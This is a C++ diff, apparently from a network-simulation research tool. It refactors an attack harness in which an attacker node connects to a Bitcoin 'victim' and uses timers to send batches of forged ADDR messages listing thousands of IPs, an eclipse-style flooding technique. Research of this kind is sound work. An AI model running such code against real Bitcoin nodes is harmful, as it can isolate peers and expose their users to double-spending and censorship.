@@ -343,8 +343,8 @@ private:
     SOCKET _socketfd;
     size_t _offset;
     bool fInbound;
-    ev::io _connsocket_watcher;
-    ev::io _datasocket_watcher;
+    std::unique_ptr<ev::io> _connsocket_watcher;
+    std::unique_ptr<ev::io> _datasocket_watcher;
     std::list<MSG> vRecvMsg;
     std::list<MSG> vProcessMsg;
     std::deque<std::vector<unsigned char>> vSendMsg;
@@ -360,6 +360,8 @@ public:
         _socketfd = fd;
         their_ip = ip, their_port = port;
         fInbound = inbound;
+        _connsocket_watcher = std::make_unique<ev::io>();
+        _datasocket_watcher = std::make_unique<ev::io>();
     }
 
     size_t getSendOffset() { return _offset; }
@@ -372,24 +374,24 @@ public:
 
     std::deque<std::vector<unsigned char>> &getVSendMsg() { return vSendMsg; }
 
-    ev::io &getDataSocketWatcher() { return _datasocket_watcher; }
+    ev::io &getDataSocketWatcher() { return *_datasocket_watcher; }
 
-    ev::io &getConnSocketWatcher() { return _connsocket_watcher; }
+    ev::io &getConnSocketWatcher() { return *_connsocket_watcher; }
 
     bool isInboundSocket() { return fInbound; }
 
     // Copy constructor : it is needed due to rvalue(?) assignment for std::map. Don't copy a watcher.
     // TODO : do not use copy. but use only move because watcher cannot be copied(?).
-    SocketControlStruct(const SocketControlStruct &s2) {
-        _socketfd = s2._socketfd;
-        _offset = s2._offset;
-        fInbound = s2.fInbound;
-        vRecvMsg = s2.vRecvMsg;
-        vProcessMsg = s2.vProcessMsg;
-        vSendMsg = s2.vSendMsg;
-        their_ip = s2.their_ip;
-        their_port = s2.their_port;
-    }
+//    SocketControlStruct(const SocketControlStruct &s2) {
+//        _socketfd = s2._socketfd;
+//        _offset = s2._offset;
+//        fInbound = s2.fInbound;
+//        vRecvMsg = s2.vRecvMsg;
+//        vProcessMsg = s2.vProcessMsg;
+//        vSendMsg = s2.vSendMsg;
+//        their_ip = s2.their_ip;
+//        their_port = s2.their_port;
+//    }
 
 };
 
@@ -618,6 +620,18 @@ public:
         _listen_watcher.set<PassiveNode, &PassiveNode::_listenSocketIOCallback>(this);
         _listen_watcher.start(_listen_sockfd, ev::READ);
     }
+
+    PassiveNode(PassiveNode &&rhs) noexcept: _listen_sockfd(std::move(rhs._listen_sockfd)),
+                                             _shadow_ip(std::move(rhs._shadow_ip)),
+                                             mSocketControl(std::move(rhs.mSocketControl)) {
+        rhs._listen_watcher.stop();
+        _listen_watcher.set<PassiveNode, &PassiveNode::_listenSocketIOCallback>(this);
+        _listen_watcher.start(_listen_sockfd, ev::READ);
+        std::cout << "passiveNode move constructor!" << "\n";
+    }
+
+    PassiveNode(const PassiveNode &rhs) = delete; // since PassiveNode includes watcher
+
 
     void ChurnOut() {
         // close all datasocket
@@ -913,7 +927,9 @@ public:
         // TODO : what if it has multiple connection? How can it recognize the victim node?
         auto&[fd, socketControl] = *mSocketControl.begin();
         std::deque<std::vector<unsigned char>> &vSendMsg = socketControl.getVSendMsg();
+        std::cout << "before ForgeAddrMsg" << "\n";
         bool ret = ForgeAddrMSG(vIP, vSendMsg, socketControl.their_ip, socketControl.their_port);
+        std::cout << "after ForgeAddrMsg" << "\n";
         if (!ret) {
             std::cout << "failed to forge ADDR msg" << "\n";
             exit(-1);
@@ -985,20 +1001,34 @@ public:
 class AddrTimer {
 private:
     ev::timer _timer;
-    ActiveNode<CNetMessage, BitcoinReceiveMsg, BitcoinProcessMsg, BitcoinForgeAddrMsg, BitcoinInitProto> &_attacker_node;
+    double _time;
+    std::shared_ptr<ActiveNode<CNetMessage, BitcoinReceiveMsg, BitcoinProcessMsg, BitcoinForgeAddrMsg, BitcoinInitProto> > _attacker_node;
     std::vector<std::string> vAddr;
 public:
     AddrTimer(double time, std::vector<std::string> addrs,
-              ActiveNode<CNetMessage, BitcoinReceiveMsg, BitcoinProcessMsg, BitcoinForgeAddrMsg, BitcoinInitProto> &node)
+              std::shared_ptr<ActiveNode<CNetMessage, BitcoinReceiveMsg, BitcoinProcessMsg, BitcoinForgeAddrMsg, BitcoinInitProto>> node)
             : vAddr(addrs), _attacker_node(node) {
         _timer.set<AddrTimer, &AddrTimer::_timerCallback>(this);
         _timer.set(time, 0.);
         _timer.start();
+        _time = time;
     }
+
+    // TODO : Maybe, don't allow move constructor for AddrTimer?
+    AddrTimer(AddrTimer &&rhs) noexcept: _time(std::move(rhs._time)), vAddr(std::move(rhs.vAddr)) {
+        _attacker_node = rhs._attacker_node;
+        rhs._timer.stop();
+        _timer.set<AddrTimer, &AddrTimer::_timerCallback>(this);
+        _timer.set(_time, 0.);
+        _timer.start();
+        std::cout << "AddrTimer's move constructor!" << "\n";
+    }
+
+    AddrTimer(const AddrTimer &rhs) = delete; // since PassiveNode includes ev::timer
 
     void _timerCallback(ev::timer &w, int revents) {
         std::cout << "timer called" << "\n";
-        _attacker_node.SendAddr(vAddr);
+        _attacker_node->SendAddr(vAddr);
     }
 };
 
@@ -1071,10 +1101,12 @@ int main(int argc, char *argv[]) {
 
     std::vector<std::string> vIp(sIp.begin(), sIp.end());
 
-//    std::vector<PassiveNode<CNetMessage, BitcoinReceiveMsg, BitcoinProcessMsg> > vPassiveNode;
-//    for (auto ip : vIp) {
-//        vPassiveNode.emplace_back(ip, 8333);
-//    }
+    std::vector<PassiveNode<CNetMessage, BitcoinReceiveMsg, BitcoinProcessMsg> > vPassiveNode;
+    for (auto ip : vIp) {
+//    for (int i = 0; i < 1000; i++) {
+//        auto ip = vIp[i];
+        vPassiveNode.emplace_back(ip, 8333);
+    }
 
     TestHelloBitcoinLib();
 
@@ -1085,17 +1117,29 @@ int main(int argc, char *argv[]) {
     puts_temp("test shadow_interface\n");
 
     // Step 1. Prepare an attacker node which connects to Bitcoin victim (thus become an inbound connection of bitcoin victim)
-    ActiveNode<CNetMessage, BitcoinReceiveMsg, BitcoinProcessMsg, BitcoinForgeAddrMsg, BitcoinInitProto> attacker_node1(
+//    ActiveNode<CNetMessage, BitcoinReceiveMsg, BitcoinProcessMsg, BitcoinForgeAddrMsg, BitcoinInitProto> attacker_node1(
+//            "1.1.0.1", 8333);
+    auto attacker_node1 = std::make_shared<ActiveNode<CNetMessage, BitcoinReceiveMsg, BitcoinProcessMsg, BitcoinForgeAddrMsg, BitcoinInitProto>>(
             "1.1.0.1", 8333);
-    attacker_node1.Connect("1.0.0.1", 18333);
+    attacker_node1->Connect("1.0.0.1", 18333);
+
 
     // Step 2. send a ADDR msg to the Bitcoin victim to indicate him establish outgoing connections.
     int start_time = 15;
     int ip_total_count = vIp.size();
-//    std::vector<AddrTimer> timers;
-//    for (int i = 0; i < ip_total_count/1000 + 1; i++) {
-//        timers.emplace_back(start_time+i, std::vector<std::string>(vIp.begin()+i*1000, vIp.begin()+(i+1)*1000), attacker_node1);
-//    }
+    std::vector<AddrTimer> timers;
+    for (int i = 0; i < ip_total_count / 1000; i++) {
+//    for (int i = 0; i < 2; i++) {
+//        std::cout << "i:" << i << "\n";
+        timers.emplace_back(start_time + i,
+                            std::vector<std::string>(vIp.begin() + i * 1000, vIp.begin() + (i + 1) * 1000),
+                            attacker_node1);
+//        timers.emplace_back(start_time+i, std::vector<std::string>(vIp.begin()+i*1000, vIp.begin()+(i)*1000+100), attacker_node1);
+    }
+    timers.emplace_back(start_time + ip_total_count / 1000 + 1,
+                        std::vector<std::string>(vIp.begin() + (ip_total_count / 1000) * 1000, vIp.end()),
+                        attacker_node1);
+
 
 //    AddrTimer addrTimer1(15, {"11.1.0.1", "11.2.0.1", "11.3.0.1", "11.4.0.1", "11.5.0.1", "11.6.0.1", "11.7.0.1", "11.8.0.1", "11.9.0.1", "11.10.0.1", "11.11.0.1", "11.12.0.1"}, attacker_node1);
 
